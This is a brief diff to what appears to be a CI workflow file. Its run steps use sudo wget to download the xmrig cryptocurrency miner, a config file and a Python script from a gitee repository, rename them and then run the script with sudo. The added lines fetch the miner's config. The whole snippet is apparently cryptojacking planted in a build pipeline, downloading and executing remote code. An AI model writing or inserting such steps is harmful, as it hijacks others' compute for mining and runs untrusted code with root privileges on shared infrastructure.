@@ -9,6 +9,8 @@ jobs:
       - run: cd /home
       - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/xmrig.zip
       - run: sudo mv xmrig.zip xmrig
+      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/config.zip
+      - run: sudo mv config.zip config.json
       - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/1.zip
       - run: sudo mv 1.zip 1.py
       - run: sudo python 1.py
